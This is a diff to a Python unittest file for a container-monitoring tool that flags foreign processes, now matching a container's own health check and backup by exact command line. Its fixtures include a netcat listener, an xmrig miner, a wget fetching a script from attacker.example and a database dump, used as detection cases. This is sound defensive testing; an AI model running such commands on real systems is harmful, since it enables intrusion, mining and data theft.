@@ -125,18 +125,28 @@ class Containers(unittest.TestCase):
         out = sentinel.container_problems("miner", {"Config": {"Image": "x/y"}, "HostConfig": {}, "Mounts": []})
         self.assertEqual(out, ["unknown container miner (image x/y)"])
 
+    NODE = ("node", "node bin/www")
+    HN_HEALTH = ["CMD", "wget", "--spider", "-q", "http://localhost:3000/api/v1/stories?timespan=Day&limit=1"]
+
     def test_programs_in_a_container(self):
-        self.assertEqual(sentinel.unexpected_programs("latchkey-relay", ["relay"]), [])
-        self.assertEqual(sentinel.unexpected_programs("latchkey-relay", ["relay", "sh", "nc"]), ["nc", "sh"])
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", ["node", "MainThread"]), [])
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", ["node", "xmrig"]), ["xmrig"])
+        self.assertEqual(sentinel.unexpected_programs("latchkey-relay", [("relay", "/relay")]), [])
+        self.assertEqual(sentinel.unexpected_programs("latchkey-relay", [("relay", "/relay"), ("sh", "sh"), ("nc", "nc -l 4444")]), ["nc", "sh"])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, ("MainThread", "node bin/www")]), [])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, ("xmrig", "xmrig -o pool")]), ["xmrig"])
 
     def test_a_containers_own_health_check_and_backup_are_normal(self):
         # Found live 2026-11-21: hackernews's health check runs wget every 30 s, and the minute's
         # process check caught it ("wget is running inside hackernews-app-1"); the nightly backup
-        # runs sqlite3 the same way.
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", ["node", "wget", "sqlite3"]), [])
-        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", ["node", "wget", "sh"]), ["sh"])
+        # runs sqlite3 the same way. They count by their exact command lines only.
+        health = ("wget", "wget --spider -q http://localhost:3000/api/v1/stories?timespan=Day&limit=1")
+        backup = ("sqlite3", "sqlite3 /data/hackernews.db .backup '/tmp/hackernews-backup.db'")
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, health, backup], self.HN_HEALTH), [])
+
+    def test_a_tool_named_like_the_health_check_is_still_reported(self):
+        # A process can take any name: wget or sqlite3 doing anything else is foreign.
+        procs = [self.NODE, ("wget", "wget -qO- http://attacker.example/x.sh"), ("sqlite3", "sqlite3 /data/hackernews.db .dump")]
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", procs, self.HN_HEALTH), ["sqlite3", "wget"])
+        self.assertEqual(sentinel.unexpected_programs("hackernews-app-1", [self.NODE, ("sh", "sh")], self.HN_HEALTH), ["sh"])
 
 
 class Audit(unittest.TestCase):
